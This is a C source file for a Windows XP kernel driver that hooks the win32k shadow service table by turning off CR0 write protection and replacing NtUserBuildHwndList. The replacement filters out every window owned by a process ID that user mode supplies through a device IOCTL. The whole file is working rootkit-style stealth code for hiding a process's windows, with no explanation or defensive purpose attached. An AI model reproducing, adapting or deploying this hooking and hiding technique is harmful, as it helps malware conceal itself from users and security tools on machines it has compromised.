#include "ntddk.h"
#include "Driver_header.h"

typedef struct QLDriver_Extension
{
	HANDLE hCommEvent;
} QL_DRIVER_EXT;

SHORT BuildNumber; /* mask off hiword to get actual number */

ULONG HiddenProcessId;

PSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTableShadow;

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

LARGE_INTEGER m_UserTime;
LARGE_INTEGER m_KernelTime;

#define SYSTEMSERVICE(_function) KeServiceDescriptorTableShadow->ntoskrnl.ServiceTable[*(PULONG)((PUCHAR)_function+1)]

#define	COMM_DRIVER_WIN32_DEV_NAME	L"\\DosDevices\\ShadowTableHookDriver"
#define	COMM_DRIVER_DEV_NAME		L"\\Device\\ShadowTableHookDriver"

#define	DEVICE_SHADOW_TABLE_HOOK_DRIVER			0x00008810

#define	IO_UNHOOK_SYSTEM_SERVICES	(ULONG) CTL_CODE(DEVICE_SHADOW_TABLE_HOOK_DRIVER, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define	IO_HOOK_SYSTEM_SERVICES		(ULONG) CTL_CODE(DEVICE_SHADOW_TABLE_HOOK_DRIVER, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define	IO_SEND_HIDDEN_PROCESS_ID	(ULONG) CTL_CODE(DEVICE_SHADOW_TABLE_HOOK_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef NTSTATUS (*NTUSERBUILDHWNDLIST)(
	IN ULONG ARG_1,
	IN ULONG hParentWnd,
	IN ULONG HwndListType, //0x00000000 for Top Level, 0x00000001 for Child
	IN ULONG ThreadId,
	IN ULONG ARG_5,
	OUT ULONG* pHandleList,
	OUT ULONG* SpaceForHandlesInBufferCount
);

typedef ULONG (*NTUSERQUERYWINDOW)(
   IN ULONG WindowHandle,
   IN ULONG TypeInformation  //0 for ProcessID, 1 for ThreadID
);

NTUSERBUILDHWNDLIST OldNtUserBuildHwndList;
NTUSERQUERYWINDOW pNtUserQueryWindow;

unsigned long _callnumber_NtUserQueryWindow = 0x00000000;
unsigned long _callnumber_NtUserBuildHwndList = 0x00000000;

void SetupCallNumbers()
{
	BuildNumber = (*NtBuildNumber & 0x0000FFFF);
	//DbgPrint("Detected build number is -> %d\n", BuildNumber);
	
	switch(BuildNumber)
	{
		case 2600:  //Callnumbers on Windows XP [No Service Pack]
		{
			_callnumber_NtUserBuildHwndList = 0x138;
			_callnumber_NtUserQueryWindow = 0x1E3;
		}
		break;

		default:
		{
			//DbgPrint("Warning - unsupported windows version\n");
		}
		break;
	}
}

void GetProcessNameOffset()
{
	PEPROCESS curproc = PsGetCurrentProcess();
	int i;

	for( i = 0; i < 3*PAGE_SIZE; i++ ) 
	{
		if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
		{
			gProcessNameOffset = i;
		}
    }
}

/* Copy the process name into the specified buffer.  */

BOOLEAN GetProcessName(PCHAR theName)
{
	PEPROCESS curproc;
	char *nameptr;
	ULONG i;
	KIRQL oldirql;

	if(gProcessNameOffset) 
    {
		curproc = PsGetCurrentProcess();
		nameptr = (PCHAR) curproc + gProcessNameOffset;
		strncpy(theName, nameptr, NT_PROCNAMELEN);
		theName[NT_PROCNAMELEN] = 0;
		return TRUE;
    } 

	return FALSE;
}

NTSTATUS NTAPI
NewNtUserBuildHwndList(
	IN ULONG ARG_1,
	IN ULONG hParentWnd,
	IN ULONG HwndListType,
	IN ULONG ThreadId,
	IN ULONG ARG_5,
	OUT ULONG* pHandleList,
	OUT ULONG* HandlesInBufferCount
)
{
	NTSTATUS Status;
	ULONG RealHwndIndex = 0;
	ULONG FakeHwndIndex = 0;
	ULONG JumpIndex = 0;
	ULONG ProcessID;
	ULONG ModifiedHandlesInBufferCount;

	Status = OldNtUserBuildHwndList(ARG_1, hParentWnd, HwndListType, ThreadId, ARG_5,
		 pHandleList, HandlesInBufferCount);

	if(STATUS_SUCCESS == Status)
	{
		ModifiedHandlesInBufferCount = *HandlesInBufferCount;

		for(RealHwndIndex = 0, FakeHwndIndex = 0; 
			FakeHwndIndex < *HandlesInBufferCount;
			RealHwndIndex++, FakeHwndIndex++)
		{
			ProcessID = pNtUserQueryWindow(pHandleList[FakeHwndIndex], 0);

			if(HiddenProcessId == ProcessID)
			{

				for(JumpIndex = 1; 
					HiddenProcessId == (ProcessID = pNtUserQueryWindow(pHandleList[FakeHwndIndex + JumpIndex], 0));
					JumpIndex++)
				{

				}

				ModifiedHandlesInBufferCount = 
					ModifiedHandlesInBufferCount - JumpIndex;
				
				FakeHwndIndex = FakeHwndIndex + JumpIndex;
			}

			pHandleList[RealHwndIndex] = pHandleList[FakeHwndIndex];
		}

		*HandlesInBufferCount = ModifiedHandlesInBufferCount;
	}

	return Status;
}

void UnhookSystemServices()
{
	_asm
	{
		CLI //dissable interrupt
		MOV EAX, CR0 //move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV CR0, EAX //write register back
	}

	if(_callnumber_NtUserBuildHwndList)
		(NTUSERBUILDHWNDLIST)
		KeServiceDescriptorTableShadow->win32k.ServiceTable[_callnumber_NtUserBuildHwndList] 
		= OldNtUserBuildHwndList;

	_asm 
	{
		MOV EAX, CR0 //move CR0 register into EAX
		OR EAX, 10000H //enable WP bit 
		MOV CR0, EAX //write register back 
		STI //enable interrupt
	}
}

void HookSystemServices()
{
	if(_callnumber_NtUserQueryWindow)
		pNtUserQueryWindow =
		(NTUSERQUERYWINDOW)KeServiceDescriptorTableShadow->win32k.ServiceTable[_callnumber_NtUserQueryWindow];

	if(_callnumber_NtUserBuildHwndList)
		OldNtUserBuildHwndList =	
		(NTUSERBUILDHWNDLIST)KeServiceDescriptorTableShadow->win32k.ServiceTable[_callnumber_NtUserBuildHwndList];

	_asm
	{
		CLI //dissable interrupt
		MOV EAX, CR0 //move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV CR0, EAX //write register back
	}

	if(_callnumber_NtUserBuildHwndList)
		(NTUSERBUILDHWNDLIST)KeServiceDescriptorTableShadow->win32k.ServiceTable[_callnumber_NtUserBuildHwndList]
			= NewNtUserBuildHwndList;
	_asm 
	{
		MOV EAX, CR0 //move CR0 register into EAX
		OR EAX, 10000H //enable WP bit 
		MOV CR0, EAX //write register back 
		STI //enable interrupt
	}
}

/*
Response to CreateFile
*/
NTSTATUS Create(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
{
	NTSTATUS status = STATUS_SUCCESS;

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

/*
Response to CloseHandle
*/
NTSTATUS Close(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
{
	NTSTATUS status = STATUS_SUCCESS;

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

/*
Resonse to DeviceIoControl
*/
NTSTATUS IoControl(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
{
	NTSTATUS					status = STATUS_SUCCESS;
	ULONG						controlCode;
	PIO_STACK_LOCATION			irpStack;
	HANDLE						hEvent;
	OBJECT_HANDLE_INFORMATION	objHandleInfo;
	LONG*						outBuf;
	ULONG*						inBuf;

	PKTHREAD pCurrentThread;
	irpStack = IoGetCurrentIrpStackLocation(Irp);
	controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	
	switch(controlCode)
	{
		case IO_UNHOOK_SYSTEM_SERVICES:
		{
			UnhookSystemServices();
			break;
		}
			
		case IO_HOOK_SYSTEM_SERVICES:
		{
			pCurrentThread = KeGetCurrentThread();
			KeServiceDescriptorTableShadow = 
				(PSERVICE_DESCRIPTOR_TABLE)pCurrentThread->ServiceTable;
			SetupCallNumbers();
			HookSystemServices();

			break;
		}

		case IO_SEND_HIDDEN_PROCESS_ID:
		{			
			inBuf = Irp->AssociatedIrp.SystemBuffer;
			HiddenProcessId = *inBuf;

			break;
		}

		default:
			break;
	}

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

VOID OnUnload(IN PDRIVER_OBJECT theDriverObject)
{
	UNICODE_STRING SymbolicName;

	RtlInitUnicodeString(&SymbolicName, COMM_DRIVER_WIN32_DEV_NAME);
	IoDeleteSymbolicLink(&SymbolicName);

	IoDeleteDevice(theDriverObject->DeviceObject);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING DeviceName;
	UNICODE_STRING SymbolicName;

	PEPROCESS CurrentProcess;

	RtlInitUnicodeString(&DeviceName, COMM_DRIVER_DEV_NAME);
	RtlInitUnicodeString(&SymbolicName, COMM_DRIVER_WIN32_DEV_NAME);

	/* Driver unload routine */
	theDriverObject->DriverUnload  = OnUnload;

	/* Initialize major functions */
	theDriverObject->MajorFunction[IRP_MJ_CREATE] = Create;
	theDriverObject->MajorFunction[IRP_MJ_CLOSE] = Close;
	theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;

	/* Initizlize device name and symbolic name */
	RtlInitUnicodeString(&DeviceName, COMM_DRIVER_DEV_NAME);
	RtlInitUnicodeString(&SymbolicName, COMM_DRIVER_WIN32_DEV_NAME);

	/*
	Create a communication object, 
	GUI application can open the device and communicate with this kernel module.
	*/
	status = IoCreateDevice(theDriverObject, sizeof(QL_DRIVER_EXT), &DeviceName,
			FILE_DEVICE_UNKNOWN, 0, TRUE, &theDriverObject->DeviceObject);

	if(status != STATUS_SUCCESS)
	{
		return status;
	}

	/* Create symbilic link */
	status = IoCreateSymbolicLink(&SymbolicName, &DeviceName);

	if(status != STATUS_SUCCESS)
	{
		return status;
	}

	GetProcessNameOffset();

	return STATUS_SUCCESS;
}
